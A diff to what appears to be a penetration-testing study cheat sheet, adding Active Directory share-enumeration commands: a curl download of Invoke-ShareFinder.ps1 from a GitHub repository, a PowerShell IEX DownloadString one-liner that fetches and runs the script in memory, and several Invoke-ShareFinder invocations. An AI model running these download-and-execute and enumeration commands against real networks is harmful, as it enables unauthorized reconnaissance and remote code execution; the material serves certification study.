@@ -682,7 +682,16 @@ Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Domain Admi
 ```
 ##### DOMAIN - FIND SHARES
 ```
-Invoke-ShareFinder -Verbose
+curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-ShareFinder.ps1 -outfile Invoke-ShareFinder.ps1
+import-module .\invoke-sharefinder.ps1
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-ShareFinder.ps1")
+```
+```
+Invoke-Sharefinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
+Invoke-Sharefinder -ExcludeStandard -ExcludePrint -ExcludeIPC
+Invoke-Sharefinder -ExcludeStandard -ExcludePrint -ExcludeIPC | findstr /V shared
 ```
 ##### DOMAIN - FIND SENSITIVE FILES
 ```
